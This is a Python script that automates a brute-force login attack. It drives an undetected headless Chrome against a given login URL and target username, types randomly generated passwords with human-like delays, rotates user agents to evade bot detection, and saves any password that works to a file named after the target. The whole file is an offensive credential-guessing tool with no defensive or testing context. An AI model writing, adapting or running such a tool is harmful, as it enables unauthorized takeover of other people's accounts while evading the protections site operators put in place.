import os
import random
import string
import sys
import time

import undetected_chromedriver as uc
from dotenv import load_dotenv
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

load_dotenv()

user_agents = []
# chrome_portable_path = os.getenv('CHROME_PORTABLE_PATH')
webdriver_path = os.getenv('WEBDRIVER_PATH')


def generate_password():
    # Define the character sets for the password
    lowercase = string.ascii_lowercase
    uppercase = string.ascii_uppercase
    numbers = string.digits
    special_chars = '!%$#&/()=?*-.,;:_<>'
    all_chars = lowercase + uppercase + numbers + special_chars

    # Generate a password of random length (6-32 characters)
    password_length = random.randint(6, 32)
    password = ''
    for i in range(password_length):
        password += random.choice(all_chars)
    return password


def browser_task(target_site, username, tmp_password):
    # create a new Chrome browser instance
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-setuid-sandbox')
    options.add_argument('--no-sandbox')

    # set a random user agent
    user_agent = random.choice(user_agents)
    options.add_argument(f'user-agent={user_agent}')

    browser = uc.Chrome(options=options, driver_executable_path=webdriver_path)
    # navigate to the website
    browser.get(target_site)

    # add random delay
    time.sleep(random.randint(2, 7))

    # find the login input field and enter username
    username_field = WebDriverWait(browser, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="username"]'))
    )
    # username_field = browser.find_element_by_css_selector('input[name="username"]')
    for c in username:
        username_field.send_keys(c)
        time.sleep(random.randrange(1, 2))
    # username_field.send_keys(username)

    # add random delay
    time.sleep(random.randint(1, 3))

    # find the password input field and enter "123"
    password_field = WebDriverWait(browser, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="password"]'))
    )
    # password_field.send_keys(tmp_password)
    for c in tmp_password:
        password_field.send_keys(c)
        time.sleep(random.randrange(1, 2))

    # add random delay
    time.sleep(random.randint(2, 4))

    # find and click the "Log in" button
    login_button = WebDriverWait(browser, 10).until(
        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="submit"]'))
    )
    login_button.click()

    # add random delay
    time.sleep(random.randint(3, 8))

    result_we_re_in = True
    if "login" in browser.current_url:
        result_we_re_in = False
        time.sleep(random.randint(1, 3))
        browser.refresh()
        if "login" in browser.current_url:
            result_we_re_in = False
    browser.close()
    time.sleep(3)
    return result_we_re_in


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)
        
    # read user agents from file
    if os.path.isfile('user_agents.txt'):
        with open('user_agents.txt') as f:
            user_agents = f.read().splitlines()

    target_site = sys.argv[1] # url https://example.com/login
    target = sys.argv[2] # target username
    if os.path.isfile(f'{target}.txt'):
        print("Target already resolved!")
        sys.exit(2)

    while True:
        tmp_pass = generate_password()
        while not browser_task(target_site, target, tmp_pass):
            tmp_pass = generate_password()
        with open(f"{target}.txt", "w") as f:
            f.write(f"{target};{tmp_pass}\n")
